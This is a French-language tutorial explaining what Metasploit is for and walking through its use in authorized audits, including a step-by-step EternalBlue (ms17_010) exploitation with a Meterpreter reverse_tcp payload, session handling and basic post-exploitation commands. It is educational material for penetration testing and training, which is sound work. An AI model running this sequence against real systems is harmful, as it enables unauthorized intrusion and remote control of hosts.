# MÉTASPLOIT

## À quoi sert vraiment Metasploit et sur quoi repose son fonctionnement

---

## 1. Définition claire et positionnement réel

### Définition

**Metasploit est un framework de validation de vulnérabilités.**

Il permet de **tester de manière contrôlée et reproductible l’exploitation de vulnérabilités connues**, dans un cadre légal tel que :

* audit de sécurité
* test d’intrusion
* laboratoire pédagogique
* environnement de formation
* validation post-correction

Metasploit **n’est pas un outil de découverte**, ni un outil automatique, ni un outil “magique”.

---

### Ce que Metasploit n’est pas

* Il ne cherche pas les failles à ta place
* Il ne contourne pas la loi
* Il ne garantit aucun succès
* Il ne remplace pas l’analyse humaine
* Il ne “hacke” pas Internet

Metasploit **exécute uniquement ce que l’opérateur décide de lancer**, sur la base d’informations préalablement collectées.

---

### Finalité en entreprise

Metasploit sert à répondre à une question centrale de la cybersécurité :

> « Si un attaquant exploitait cette vulnérabilité, quel serait l’impact réel sur le système, les données et l’organisation ? »

Il transforme une **hypothèse de risque** en **preuve technique mesurable**.

---

## 2. Sur quoi se base Metasploit

Le fonctionnement de Metasploit repose sur **quatre piliers techniques fondamentaux**.

---

## 2.1 Les vulnérabilités connues (CVE)

### Principe fondamental

Metasploit **n’invente pas de vulnérabilités**.

Chaque exploit est basé sur :

* une vulnérabilité publiée
* documentée
* analysée
* souvent associée à un identifiant CVE
* parfois déjà corrigée par un patch

---

### Types de vulnérabilités exploitées

Exemples courants :

* dépassement de mémoire (buffer overflow)
* authentification mal implémentée
* service exposé sans contrôle d’accès
* mauvaise configuration par défaut
* logique applicative défaillante

Dans la majorité des cas :

* un module Metasploit = un CVE précis
* ou = une mauvaise configuration connue et documentée

Metasploit **ne découvre pas**, il **rejoue**.

---

## 2.2 Les protocoles réseau

### Principe

Metasploit s’appuie sur le **fonctionnement normal des protocoles réseau**.

Il ne “brise” pas le protocole, il l’utilise **exactement comme un client légitime**, mais avec des données spécifiquement construites.

---

### Exemples

| Protocole | Faiblesse exploitée               |
| --------- | --------------------------------- |
| SMB       | Mauvaise gestion mémoire          |
| HTTP      | Paramètres insuffisamment filtrés |
| FTP       | Authentification faible           |
| SSH       | Configuration incorrecte          |
| RPC       | Services trop exposés             |

Le protocole accepte la requête, mais le service qui l’implémente **réagit mal**.

---

## 2.3 Le fonctionnement interne des systèmes

Metasploit exploite des erreurs **logiques**, **structurelles** ou **de contrôle** dans :

* systèmes d’exploitation (Windows, Linux)
* services réseau
* serveurs web
* applications

---

### Grandes catégories (sans détails dangereux)

| Type                  | Principe                              |
| --------------------- | ------------------------------------- |
| Dépassement mémoire   | Absence de contrôle de taille         |
| Mauvaise vérification | Authentification ou droits incorrects |
| Exécution non filtrée | Données interprétées comme code       |
| Droits excessifs      | Service trop privilégié               |

Metasploit **automatise ces scénarios**, mais ne les invente pas.

---

## 2.4 La chaîne d’exploitation : Exploit → Payload

C’est le cœur conceptuel du framework.

---

### Exploit : le déclencheur

L’exploit :

* cible un service précis
* utilise une vulnérabilité précise
* provoque un comportement anormal

Un exploit seul **n’apporte aucune valeur métier**.

---

### Payload : l’impact

Le payload représente **la conséquence mesurable** de l’exploitation.

Exemples d’impact en audit :

* prouver une exécution de commande
* démontrer un accès non autorisé
* récupérer des informations système
* établir une session contrôlée

Payload ≠ malware
Payload = **preuve technique d’impact**

---

## 3. Pourquoi Metasploit existe

### Avant Metasploit

* exploits isolés
* scripts peu lisibles
* résultats non reproductibles
* risque élevé d’erreur
* très peu pédagogique

---

### Apports de Metasploit

#### Standardisation

* même structure de modules
* mêmes options
* mêmes commandes

#### Sécurité

* code revu
* comportement contrôlé
* réduction des erreurs humaines

#### Répétabilité

* tests reproductibles
* preuves vérifiables
* résultats comparables

#### Formation

* compréhension réelle des attaques
* apprentissage des mécanismes
* amélioration des défenses

---

## 4. Metasploit dans l’écosystème sécurité

### Ce que Metasploit n’est pas

Metasploit **n’est pas un scanner de vulnérabilités**.

| Outil      | Rôle           |
| ---------- | -------------- |
| Nmap       | Découverte     |
| Nessus     | Identification |
| Metasploit | Validation     |

---

### Ordre logique d’utilisation

1. Découverte réseau
2. Énumération des services
3. Analyse des vulnérabilités
4. Sélection ciblée
5. Validation par exploitation contrôlée

Metasploit intervient **après l’analyse**, jamais avant.

---

## 5. Cas d’usage concrets

### 5.1 Pentest professionnel

* prouver l’exploitabilité réelle
* mesurer l’impact métier
* fournir une preuve claire au client
* prioriser les corrections

---

### 5.2 Équipe défensive (Blue Team)

* tester ses propres systèmes
* comprendre les vecteurs d’attaque
* améliorer détection et durcissement

---

### 5.3 Formation et laboratoires

* comprendre les mécanismes d’attaque
* visualiser l’impact réel
* éviter l’approche “copier-coller”

---

### 5.4 Vérification post-correction

* confirmer l’efficacité d’un patch
* éliminer les faux positifs
* valider la remédiation

---

## 6. Ce que Metasploit ne fait pas

* ne trouve pas automatiquement des failles
* ne remplace pas un audit humain
* ne contourne pas les règles légales
* ne garantit pas un accès
* ne décide jamais à la place de l’opérateur

Metasploit est **un outil**, pas une intention.

---

## 7. Metasploit dans la chaîne de sécurité

```
Cartographie → Détection → Validation → Correction
   Nmap        Scanner     Metasploit     Administrateur
```

Metasploit transforme un risque théorique en **réalité mesurable**, afin de pouvoir la corriger.

---

## 8. Principe fondamental à retenir

**Metasploit ne sert pas à attaquer.**
**Il sert à prouver qu’une attaque est possible, pour éviter qu’elle ne se produise.**



## Utilisation opérationnelle en audit, labo et formation

---

## 1. Pré-requis et cadre d’utilisation

### Cadre obligatoire

Metasploit s’utilise uniquement :

* sur des environnements **autorisés**
* en laboratoire (VM, plateformes d’apprentissage)
* dans un cadre contractuel (audit, pentest)

Toute utilisation hors de ce cadre est illégale.

---

### Pré-requis techniques

* Système Linux (Kali Linux recommandé)
* Accès réseau à la cible
* Résultats de reconnaissance préalables (ex : Nmap)
* Compréhension minimale des services réseau

Metasploit **ne remplace pas la phase de reconnaissance**.

---

## 2. Logique globale d’utilisation

La pratique Metasploit suit **toujours la même logique** :

```
Information → Sélection → Configuration → Exécution → Validation → Documentation
```

Aucune étape ne doit être sautée.

---

## 3. Démarrage de Metasploit

### Lancer la console

```bash
msfconsole
```

La console est l’interface principale du framework.

---

### Mode silencieux (en pratique pro)

```bash
msfconsole -q
```

Réduit le bruit visuel et améliore la lisibilité en audit.

---

## 4. Recherche de modules (phase d’analyse)

### Principe

On ne lance **jamais un exploit au hasard**.
On cherche un module **en fonction des informations déjà connues**.

---

### Recherche par service

```bash
search smb
search ftp
search http
```

Objectif : identifier les modules liés aux services découverts.

---

### Recherche par vulnérabilité connue

```bash
search cve:2017
search ms17_010
```

Objectif : faire le lien entre une vulnérabilité identifiée et un module existant.

---

### Recherche filtrée (bonne pratique)

```bash
search type:exploit platform:windows
search rank:excellent
```

Cela permet d’éviter les modules instables ou expérimentaux.

---

## 5. Modules auxiliaires (reconnaissance active)

### Rôle des modules auxiliaires

Les modules auxiliaires servent à :

* confirmer une information
* affiner l’énumération
* réduire les faux positifs

Ils **ne compromettent pas** la cible.

---

### Exemple conceptuel

Scanner la version d’un service pour confirmer une hypothèse.

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.10
run
```

Objectif :

* confirmer le service
* confirmer la version
* décider si une exploitation est pertinente

---

## 6. Sélection d’un exploit

### Charger un exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

À ce stade :

* rien n’est exécuté
* aucun paquet dangereux n’est envoyé

---

### Analyse du module

```bash
info
```

Toujours lire :

* la description
* les systèmes affectés
* les conditions requises
* les références CVE

---

## 7. Configuration de l’exploit

### Afficher les options

```bash
show options
```

Chaque exploit possède :

* des options obligatoires
* des options facultatives

---

### Variables fondamentales

| Variable | Rôle            |
| -------- | --------------- |
| RHOSTS   | Cible           |
| RPORT    | Port            |
| LHOST    | Adresse locale  |
| LPORT    | Port local      |
| PAYLOAD  | Impact démontré |

---

### Configuration typique (exemple pédagogique)

```bash
set RHOSTS 192.168.1.10
set LHOST 192.168.1.20
```

À ce stade, **aucune exploitation n’a encore lieu**.

---

## 8. Choix du payload (preuve d’impact)

### Principe clé

Le payload doit être :

* adapté au système
* proportionné à l’objectif
* justifiable dans un rapport

---

### Lister les payloads compatibles

```bash
show payloads
```

---

### Exemple de sélection raisonnée

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

Dans un audit, Meterpreter sert à :

* prouver l’exécution
* collecter des informations
* démontrer l’impact

---

## 9. Lancement de l’exploitation

### Exécution

```bash
exploit
```

À cet instant seulement :

* l’exploit est déclenché
* le payload est exécuté si la faille existe

---

### Résultat attendu

Deux cas possibles :

* échec (cible non vulnérable, protégée, patchée)
* succès (preuve technique obtenue)

Un échec est **un résultat valide en audit**.

---

## 10. Gestion des sessions

### Lister les sessions

```bash
sessions
```

---

### Interagir avec une session

```bash
sessions -i 1
```

Chaque session représente une **preuve d’accès**, pas une fin en soi.

---

## 11. Post-exploitation minimale (preuve contrôlée)

### Objectif

La post-exploitation en audit vise à :

* démontrer l’impact
* collecter des preuves
* limiter les actions

---

### Exemples d’actions légitimes

```bash
sysinfo
getuid
```

Ces commandes permettent de prouver :

* le système ciblé
* le niveau de privilège

---

### Principe fondamental

On ne fait **que ce qui est nécessaire pour la démonstration**.

---

## 12. Modules post-exploitation

### Rôle

Les modules post permettent :

* d’automatiser la collecte d’informations
* d’éviter des actions manuelles risquées

---

### Exemple

```bash
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```

Objectif : produire une information exploitable pour le rapport.

---

## 13. Nettoyage et fin de test

### Fermeture des sessions

```bash
sessions -k 1
```

Toujours fermer les accès ouverts.

---

### Pourquoi le nettoyage est crucial

* responsabilité professionnelle
* respect du périmètre
* conformité légale
* éthique

---

## 14. Documentation et reporting

Chaque test Metasploit doit produire :

* la vulnérabilité exploitée
* les conditions nécessaires
* l’impact démontré
* la preuve technique
* la recommandation

Sans rapport, **l’exploitation n’a aucune valeur**.

---

## 15. Erreurs pratiques fréquentes

* lancer un exploit sans reconnaissance
* choisir un payload inadapté
* surexploiter la cible
* ne pas documenter
* confondre apprentissage et attaque réelle

---

## 16. Résumé opérationnel

Metasploit en pratique, c’est :

1. analyser
2. choisir
3. configurer
4. exécuter
5. prouver
6. documenter
7. corriger

---

## 17. Principe final

Metasploit est un **instrument de démonstration**, pas un objectif.

Un bon audit :

* exploite peu
* explique beaucoup
* améliore réellement la sécurité


